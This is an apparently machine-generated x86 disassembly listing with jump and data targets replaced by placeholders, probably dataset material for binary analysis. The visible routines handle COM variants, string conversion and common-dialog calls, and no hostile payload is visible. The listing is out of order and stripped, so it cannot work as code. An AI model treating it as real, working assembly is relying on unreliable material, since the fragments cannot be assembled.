call sub_42f0a0
mov edi esp
test edi edi
jne r-xdata
or [ edi + esi ] 0xff
inc esi
mov [ edi + esi ] al
and [ edi + esi + 0x1 ] 0x0
mov eax [ ebx + 0x14 ]
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1c ] eax
push 0xe
pop eax
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x14
push ebx
mov ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
lea eax [ ebp - 0x34 ]
push [ ebp + 0x14 ]
push [ ebp - 0x18 ]
push eax
push [ ebp + 0x8 ]
push edi
call sub_45719c
xor ebx ebx
mov [ ebp + 0x18 ] eax
test eax eax
jne r-xdata
mov esi [ ebp + 0x14 ]
xor edi edi
cmp [ esi + 0x8 ] edi
jbe r-xdata
movzx eax [ ebp - 0x18 ]
and [ ebp - 0x4 ] ebx
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp + 0xc ] eax
push esi
push edi
push [ ebp - 0x1c ]
call sub_457f7d
fstp [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
call [ VariantClear@IAT ]
add [ ebp + 0xc ] 0x10
inc edi
cmp edi [ esi + 0x8 ]
jb r-xdata
push esi
push edi
push [ ebp - 0x1c ]
call sub_457f7d
fst [ ebp - 0x24 ]
jmp r-xdata
dec eax
push esi
push edi
dec eax
push [ ebp - 0x1c ]
je r-xdata
movzx eax [ ebp - 0x18 ]
sub eax 0x8
je r-xdata
mov ecx [ ebp - 0x18 ]
mov [ eax ] cx
movzx ecx cx
add ecx 0xfffffffe
cmp ecx 0x10
ja r-xdata
fstp [ ebp - 0x34 ]
jmp r-xdata
call sub_457f7d
fst [ ebp - 0x24 ]
call sub_457f7d
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
dec eax
je r-xdata
xor eax eax
jmp [ ecx * 4 + jump_table_45767f ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
call [ SysFreeString@IAT ]
test ebx ebx
je r-xdata
sub eax 0x3
je r-xdata
mov [ eax + 0x8 ] bl
jmp r-xdata
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x30 ]
mov [ eax + 0xc ] ecx
jmp r-xdata
fld [ ebp - 0x34 ]
fstp [ eax + 0x8 ]
jmp r-xdata
neg ebx
sbb ebx ebx
mov [ eax + 0x8 ] bx
jmp r-xdata
lea esi [ ebp - 0x34 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ ebx ]
push ebx
call [ eax + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
call [ VariantClear@IAT ]
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_4575d2
mov esi [ ebp + 0x14 ]
xor edi edi
cmp [ esi + 0x8 ] edi
jbe r-xdata
push 0x0
push 0x0
call sub_42dca7
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov ebx [ ebp + 0xc ]
xor eax eax
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x44 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x14
push ebx
call [ VariantClear@IAT ]
inc edi
add ebx 0x10
cmp edi [ esi + 0x8 ]
jb r-xdata
sub_4576c3
mov eax sub_464bfe
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x2
call sub_442148
lea ecx [ esi + 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_45772a
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
push edi
xor esi esi
push 0x20
push esi
push [ ebp + 0x8 ]
call sub_42dc30
mov ecx [ ebp + 0xc ]
add esp 0xc
lea eax [ ebp - 0x110 ]
push r--data
mov [ ebp - 0xc ] eax
call sub_442eba
mov edi [ lstrlenA@IAT ]
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
push r--data
call sub_442eba
test eax eax
lea eax [ ebp - 0x110 ]
push 0x100
push eax
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0xc ]
mov dx [ eax + 0x8 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
mov edx [ eax + 0x10 ]
mov [ ecx + 0x10 ] edx
mov edx [ eax + 0x1c ]
mov [ ecx + 0x1c ] edx
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x10 ] ecx
cmp [ ecx - 0x8 ] esi
je r-xdata
push 0xf108
call sub_44384a
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xf108
push 0xf10a
call sub_44384a
mov eax [ ebp + 0x8 ]
mov [ eax ] 0xf10a
jmp r-xdata
mov eax [ eax + 0x18 ]
mov [ ebp + 0xc ] eax
cmp [ eax - 0x8 ] esi
je r-xdata
cmp ecx esi
jne r-xdata
push [ ebp - 0xc ]
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_42f0a0
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
push eax
push 0xffffffff
push [ ebp - 0xc ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp + 0xc ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0xc ] esi
jne r-xdata
cmp eax esi
jne r-xdata
push ecx
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_42f0a0
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push eax
push 0xffffffff
push [ ebp - 0x10 ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp - 0x8 ]
xor eax eax
jmp r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
call sub_45357b
mov eax [ eax + 0x10 ]
cmp eax esi
mov [ ebp + 0xc ] eax
jne r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] esi
mov [ ecx + 0x8 ] eax
jne r-xdata
push eax
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_42f0a0
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push eax
push 0xffffffff
push [ ebp + 0xc ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp - 0x8 ]
xor eax eax
jmp r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0xc ]
lea esp [ ebp - 0x11c ]
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp [ ecx + 0x10 ] esi
je r-xdata
push eax
call edi
inc eax
mov [ ebp - 0x4 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_42f0a0
mov eax esp
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
push eax
push 0xffffffff
push [ ebp + 0xc ]
mov [ eax ] si
push esi
push esi
call ebx
mov eax [ ebp - 0x8 ]
xor eax eax
jmp r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8c ]
cmp eax esi
mov [ ebp + 0xc ] eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
push esi
call [ SysAllocString@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
push eax
call edi
mov edi eax
inc edi
lea eax [ edi + edi ]
add eax 0x3
and al 0xfc
call sub_42f0a0
mov eax esp
push edi
push eax
push 0xffffffff
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov [ eax ] si
push esi
push esi
call ebx
mov esi [ ebp - 0x8 ]
sub_457966
mov eax sub_464c31
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_442f71
mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ rw-data ]
mov [ esi + 0x14 ] eax
mov eax [ rw-data ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov di [ ebp + 0x10 ]
mov edx eax
add eax 0x60000
neg edx
sbb edx edx
mov [ ebp - 0x4 ] 0x3
and edx eax
cmp [ ebp + 0x8 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x10 ] edx
mov [ esi + 0x8 ] di
je r-xdata
neg di
mov ecx [ ebp - 0xc ]
mov eax esi
sbb edi edi
and edi 0x7fff0001
add edi 0x8000ffff
mov [ esi + 0x1c ] edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
push [ ebp + 0x8 ]
call sub_4422d1
sub_457a3c
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn
cmp [ esi + 0x4 ] 0x0
je r-xdata
and [ esi ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_457a56
mov eax sub_464c45
call sub_42dc88
sub esp 0x60
push ebx
mov ebx ecx
push esi
push edi
cmp [ ebx ] 0x0
mov [ ebp - 0x28 ] ebx
je r-xdata
mov ecx [ ebp - 0xc ]
lea esp [ ebp - 0x78 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x18
push 0x10
lea eax [ ebp - 0x4c ]
push 0x0
push eax
call sub_42dc30
mov edi [ ebp + 0x18 ]
add esp 0xc
test edi edi
je r-xdata
mov eax [ ebp - 0x44 ]
push edi
call [ lstrlenA@IAT ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
test eax eax
je r-xdata
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x48 ] ecx
test [ ebp + 0xc ] 0xc
mov [ ebp - 0x1c ] 0xfffffffd
je r-xdata
lea eax [ ebp - 0x3c ]
xor esi esi
push eax
call sub_426793
cmp [ ebp + 0x10 ] si
je r-xdata
shl eax 0x4
push eax
call sub_441e89
mov esi eax
mov eax [ ebp - 0x44 ]
shl eax 0x4
push eax
push 0x0
push esi
mov [ ebp - 0x4c ] esi
call sub_42dc30
mov eax [ ebp - 0x44 ]
add esp 0x10
shl eax 0x4
cmp [ edi ] 0x0
mov [ ebp - 0x14 ] edi
lea esi [ eax + esi - 0x10 ]
mov [ ebp - 0x10 ] esi
je r-xdata
push 0x20
lea eax [ ebp - 0x6c ]
push 0x0
push eax
call sub_42dc30
add esp 0xc
lea edx [ ebp - 0x2c ]
mov eax [ ebx ]
or [ ebp - 0x2c ] 0xffffffff
push edx
lea edx [ ebp - 0x6c ]
push edx
lea edx [ ebp - 0x4c ]
push esi
push edx
push [ ebp + 0xc ]
mov ecx [ eax ]
push 0x0
push r--data
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x18 ]
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x44 ]
test eax eax
je r-xdata
lea esi [ ebp - 0x3c ]
mov eax [ ebp + 0x1c ]
add esi 0x8
push 0x4
mov [ ebp - 0x18 ] esi
lea ebx [ eax - 0x4 ]
add eax 0xfffffff8
mov [ ebp + 0x1c ] eax
pop edi
push [ ebp - 0x4c ]
call sub_441eb2
xor ebx ebx
pop ecx
cmp [ ebp + 0x18 ] ebx
jge r-xdata
mov ecx [ ebp - 0x4c ]
mov esi edi
shl eax 0x4
cmp [ edi ] 0x0
lea ebx [ eax + ecx - 0x10 ]
je r-xdata
movzx eax [ ecx ]
mov ecx 0x4002
cmp eax ecx
jg r-xdata
and ax 0xffbf
or ah 0x40
mov [ ecx ] ax
mov edi [ ebp + 0x10 ]
cmp di bx
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
call [ VariantClear@IAT ]
cmp [ ebp + 0x18 ] 0x80020009
je r-xdata
mov al [ esi ]
cmp al 0x8
je r-xdata
add eax 0xffffbffd
cmp eax 0xe
ja r-xdata
je r-xdata
cmp di 0xc
je r-xdata
cmp [ ebp - 0x54 ] ebx
je r-xdata
push [ ebp + 0x18 ]
call sub_45663d
push ebx
call [ VariantClear@IAT ]
cmp al 0xe
jne r-xdata
sub [ ebp - 0x10 ] 0x10
sub esi 0x10
inc [ ebp - 0x14 ]
mov [ ebp - 0x18 ] esi
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x0
jne r-xdata
jmp [ eax * 4 + jump_table_457f01 ]
add [ ebp + 0x1c ] edi
mov eax [ ebx + edi ]
add ebx edi
add eax 0xfffffffe
cmp eax 0xf
ja r-xdata
movzx eax di
add eax 0xfffffffe
cmp eax 0xf
ja r-xdata
push edi
lea eax [ ebp - 0x3c ]
push ebx
push eax
lea eax [ ebp - 0x3c ]
push eax
call [ VariantChangeType@IAT ]
mov esi eax
cmp esi ebx
jge r-xdata
push 0x20
call sub_441e89
pop ecx
mov [ ebp + 0x14 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ ebp - 0x6c ]
push eax
call [ ebp - 0x54 ]
sub ebx 0x10
inc esi
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
movzx ax [ eax ]
test al 0x40
mov [ ecx ] ax
je r-xdata
mov ebx [ ebp - 0x28 ]
mov edi [ ebp + 0x18 ]
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
mov ecx [ eax ]
neg ecx
sbb ecx ecx
and ecx 0xffff
mov [ eax ] ecx
jmp r-xdata
jmp [ eax * 4 + jump_table_457ec1 ]
jmp [ eax * 4 + jump_table_457f3d ]
lea eax [ ebp - 0x3c ]
push eax
call [ VariantClear@IAT ]
push esi
call sub_45663d
xor esi esi
push [ ebp - 0x6c ]
mov ecx eax
push ebx
push ebx
call sub_457966
mov esi eax
jmp r-xdata
mov [ esi ] eax
add [ ebp + 0x1c ] edi
mov al [ ebx + edi ]
add ebx edi
mov [ esi ] al
jmp r-xdata
add [ ebp + 0x1c ] edi
mov ax [ ebx + edi ]
add ebx edi
add [ ebp + 0x1c ] 0x8
add ebx 0x8
mov eax [ ebp + 0x1c ]
fld [ eax ]
fstp [ esi ]
jmp r-xdata
add [ ebp + 0x1c ] 0x8
add ebx 0x8
mov eax [ ebp + 0x1c ]
fld [ eax ]
fstp [ esi ]
jmp r-xdata
add [ ebp + 0x1c ] edi
mov eax [ ebx + edi ]
add ebx edi
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
push eax
mov [ ebp - 0x18 ] eax
call [ SysAllocString@IAT ]
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] eax
je r-xdata
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + edi ]
add [ ebp + 0x1c ] edi
add ebx edi
neg eax
sbb eax eax
jmp r-xdata
add [ ebp + 0x1c ] 0x4
mov esi [ ebx + 0x4 ]
mov edi [ ebp - 0x10 ]
add ebx 0x4
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x18 ]
push 0x4
pop edi
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov cl [ ebp - 0x34 ]
mov [ eax ] cl
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov cx [ ebp - 0x34 ]
mov [ eax ] cx
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x34 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
push [ ebp - 0x34 ]
push [ ebp + 0x14 ]
call sub_4564dc
push [ ebp - 0x34 ]
call [ SysFreeString@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp - 0x34 ] bx
setne al
mov [ ecx ] eax
jmp r-xdata
mov edi [ ebp + 0x14 ]
lea esi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x34 ]
mov [ eax ] ecx
cmp [ ebp - 0x64 ] ebx
je r-xdata
push [ ebp - 0x68 ]
lea ecx [ esi + 0x18 ]
call sub_4422f8
push [ ebp - 0x68 ]
call edi
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x68 ] ebx
mov edi [ SysFreeString@IAT ]
je r-xdata
test eax eax
jne r-xdata
push eax
call [ SysAllocString@IAT ]
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] eax
je r-xdata
push [ ebp - 0x18 ]
call [ lstrlenA@IAT ]
inc eax
mov [ ebp - 0x20 ] eax
add eax eax
add eax 0x3
and al 0xfc
call sub_42f0a0
mov eax esp
push [ ebp - 0x20 ]
xor ecx ecx
mov [ ebp - 0x24 ] eax
push eax
push 0xffffffff
push [ ebp - 0x18 ]
mov [ eax ] cx
push ecx
push ecx
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp - 0x24 ]
mov [ esi ] ax
jmp r-xdata
cmp [ ebp - 0x60 ] ebx
je r-xdata
push [ ebp - 0x64 ]
lea ecx [ esi + 0xc ]
call sub_4422f8
push [ ebp - 0x64 ]
call edi
call sub_43b7b5
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x8
jmp r-xdata
test eax eax
jne r-xdata
mov eax [ ebp - 0x5c ]
push r--data
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x50 ]
mov [ esi + 0x1c ] eax
lea eax [ ebp + 0x14 ]
push eax
mov [ ebp + 0x14 ] esi
call sub_42dca7
push [ ebp - 0x60 ]
lea ecx [ esi + 0x14 ]
call sub_4422f8
push [ ebp - 0x60 ]
call edi
call sub_43b7b5
sub_457f8e
push esi
mov esi ecx
xor eax eax
cmp [ esi + 0x98 ] eax
sete al
push eax
call sub_457fdd
mov ecx [ esi + 0x98 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x8 ]
push edi
lea edi [ esi + 0x94 ]
mov [ eax + 0xc ] ecx
mov ecx [ edi ]
mov [ eax + 0x8 ] ecx
push [ esi + 0x98 ]
mov esi [ GlobalUnlock@IAT ]
call esi
push [ edi ]
call esi
push 0x1
pop eax
pop edi
xor eax eax
jmp r-xdata
pop esi
retn 0x4
sub_457fdd
mov eax sub_463816
call sub_42dc88
sub esp 0x154
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
push esi
push edi
mov edi ecx
jne r-xdata
push ebx
push 0x14000c
push 0x1
lea ecx [ ebp - 0x160 ]
call sub_43b7ed
lea ecx [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0x2
call sub_43ba60
mov eax [ edi + 0x94 ]
cmp eax ebx
je r-xdata
mov eax [ edi + 0x98 ]
cmp eax ebx
je r-xdata
mov eax [ edi + 0x98 ]
lea esi [ edi + 0x98 ]
cmp eax ebx
je r-xdata
push eax
call sub_447a7b
push eax
call [ GlobalLock@IAT ]
mov esi eax
test [ esi + 0x6 ] 0x1
je r-xdata
mov eax [ ebp - 0x104 ]
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ eax + 0x8 ]
mov [ edi + 0x94 ] ecx
mov eax [ eax + 0xc ]
mov [ esi ] eax
lea ecx [ ebp - 0x160 ]
push eax
call sub_447a7b
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push ebx
push 0x14000c
push 0x1
lea ecx [ ebp - 0xbc ]
call sub_43b7ed
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x4 ] ebx
call sub_43ba60
mov eax [ ebp - 0x60 ]
cmp [ eax + 0xc ] ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
lea ecx [ ebp - 0xbc ]
push eax
call sub_43b9a7
push [ eax ]
mov ebx [ lstrcmpA@IAT ]
movzx eax [ esi ]
add eax esi
mov [ ebp - 0x4 ] 0x1
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ edi + 0x94 ]
lea esi [ edi + 0x94 ]
cmp eax ebx
je r-xdata
mov bl 0x1
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0xbc ]
push eax
call sub_43b9e4
push [ eax ]
movzx eax [ esi + 0x2 ]
add eax esi
push eax
call ebx
test eax eax
lea ecx [ ebp - 0x14 ]
setne [ ebp + 0xb ]
call sub_442148
cmp [ ebp + 0xb ] 0x0
jne r-xdata
push [ edi + 0x98 ]
call sub_447a7b
mov [ esi ] ebx
mov [ edi + 0x98 ] ebx
jmp r-xdata
push eax
call sub_447a7b
mov eax [ ebp - 0x60 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x94 ]
lea esi [ edi + 0x94 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0xbc ]
push eax
call sub_43ba22
push [ eax ]
movzx eax [ esi + 0x4 ]
add eax esi
push eax
call ebx
test eax eax
lea ecx [ ebp - 0x18 ]
setne bl
call sub_442148
test bl bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xbc ]
jmp r-xdata
mov eax [ ebp - 0x60 ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
push eax
call sub_447a7b
push [ edi + 0x98 ]
call sub_447a7b
mov eax [ ebp - 0x60 ]
mov ecx [ eax + 0x8 ]
mov [ esi ] ecx
mov eax [ eax + 0xc ]
mov [ edi + 0x98 ] eax
jmp r-xdata
push eax
call sub_447a7b
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_442148
test bl bl
je r-xdata
call sub_43da87
push eax
call sub_447a7b
sub_4581eb
push ebx
push ebp
push esi
xor ebp ebp
push edi
mov edi ecx
push ebp
call sub_457fdd
mov esi [ esp + 0x14 ]
mov ecx [ edi + 0x94 ]
mov eax [ esi + 0x5c ]
mov [ eax + 0x8 ] ecx
mov eax [ esi + 0x5c ]
mov ecx [ edi + 0x98 ]
mov [ eax + 0xc ] ecx
mov eax [ esi + 0x5c ]
mov eax [ eax + 0x8 ]
mov [ edi + 0x94 ] eax
mov eax [ esi + 0x5c ]
mov eax [ eax + 0xc ]
mov [ edi + 0x98 ] eax
cmp ebx 0x2
je r-xdata
call CommDlgExtendedError
cmp eax 0x1009
je r-xdata
mov eax [ esi + 0x5c ]
mov eax [ eax + 0xc ]
cmp eax ebp
je r-xdata
cmp eax 0x100a
jbe r-xdata
mov eax [ esi + 0x5c ]
mov eax [ eax + 0x8 ]
cmp eax ebp
je r-xdata
push eax
call sub_447a7b
mov eax [ esi + 0x5c ]
mov [ eax + 0xc ] ebp
mov [ edi + 0x98 ] ebp
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn 0x4
cmp eax 0x100c
ja r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb8 ]
mov ebx eax
cmp ebx 0x1
je r-xdata
push eax
call sub_447a7b
mov eax [ esi + 0x5c ]
mov [ eax + 0x8 ] ebp
mov [ edi + 0x94 ] ebp
jmp r-xdata
sub_4582a0
mov eax sub_46382b
call sub_42dc88
sub esp 0xa4
push esi
mov esi ecx
push 0x0
push 0x14000c
push 0x1
lea ecx [ ebp - 0xb0 ]
call sub_43b7ed
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xb0 ]
push eax
mov ecx esi
call sub_4581eb
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xb0 ]
call sub_43da87
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_458317
push esi
push edi
mov edi ecx
push 0x18
call sub_441e89
test eax eax
pop ecx
je r-xdata
xor esi esi
mov ecx eax
call sub_4582f5
mov esi eax
jmp r-xdata
pop edi
pop esi
retn
push 0xffffffff
push eax
push 0xf109
call sub_4496ef
push esi
call sub_441eb2
pop ecx
push esi
push r--data
push edi
push 0x7803
mov ecx edi
call sub_458362
test eax eax
jne r-xdata
sub_458362
mov eax sub_463bc9
call sub_42dc88
sub esp 0x24
push ebx
push esi
push edi
mov esi ecx
call sub_420710
mov edi eax
xor ebx ebx
push 0x14
lea eax [ ebp - 0x30 ]
push ebx
push eax
call sub_42dc30
mov eax [ esi + 0x3c ]
mov ecx [ ebp + 0x10 ]
add esp 0xc
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x24 ] esi
call sub_442eec
mov esi eax
cmp esi ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edi
mov [ esi + 0x88 ] eax
mov edx [ edi ]
push eax
push 0x1
call [ edx + 0xd0 ]
push 0x88
call sub_441e89
pop ecx
mov [ ebp + 0x10 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
xor eax eax
mov ecx eax
call sub_44e02a
jmp r-xdata
mov eax [ esi + 0x8c ]
lea ecx [ ebp - 0x30 ]
push ecx
push 0xe900
lea ecx [ ebp - 0x1c ]
push edi
push ecx
mov [ eax + 0x3c ] 0x1
mov eax [ esi ]
push 0x50800000
push ebx
push ebx
mov ecx esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
call [ eax + 0x54 ]
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
mov eax [ edi ]
mov ecx edi
push ebx
call [ eax + 0xd0 ]
mov ecx [ esi + 0x8c ]
cmp ecx ebx
je r-xdata
movzx ecx [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xe802
push 0x2800
push ecx
push edi
mov ecx eax
mov [ esi + 0x8c ] eax
call sub_44e09e
test eax eax
jne r-xdata
mov ecx edi
call sub_4504c3
mov ecx [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc0 ]
mov ecx eax
call sub_4504c3
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
mov eax [ edi ]
mov ecx edi
push ebx
call [ eax + 0xd0 ]
mov [ esi + 0x8c ] ebx
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
push [ ebp + 0xc ]
mov ecx esi
call sub_4586c5
test eax eax
jne r-xdata
mov edx [ eax ]
push eax
push eax
push ebx
mov ecx eax
call [ edx + 0xe4 ]
mov [ esi + 0x88 ] ebx
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
push 0x1
push esi
mov ecx edi
call sub_4504ca
mov eax [ esi + 0x8c ]
push ebx
push 0x1
push 0x363
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0xc8 ]
push [ edi + 0x1c ]
call [ UpdateWindow@IAT ]
mov ecx esi
call sub_4589bd
jmp r-xdata
push 0x1
pop eax
sub_458536
mov eax sub_463be7
call sub_42dc88
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x18 ] esi
call sub_4487eb
xor edi edi
lea ecx [ esi + 0x78 ]
mov [ ebp - 0x4 ] edi
call sub_446b68
lea ebx [ esi + 0x94 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] 0x2
mov ecx [ ebp - 0x10 ]
call sub_4585f5
add [ ebp - 0x10 ] 0x28
dec [ ebp - 0x14 ]
jne r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
mov [ esi + 0x70 ] edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x114 ] edi
mov [ esi + 0x74 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0x100 ] edi
mov [ esi + 0xe4 ] edi
mov [ esi + 0xec ] edi
mov [ esi + 0x64 ] eax
mov [ esi + 0x40 ] eax
mov [ esi ] r--data
mov [ esi + 0x90 ] ebx
mov [ esi + 0xf0 ] 0x2
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
sub_4585f8
mov eax sub_463c07
call sub_42dc88
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x78 ]
mov [ ebp - 0x4 ] 0x1
call sub_446c56
mov edi [ esi + 0x114 ]
test edi edi
je r-xdata
push [ esi + 0x88 ]
call sub_441eb2
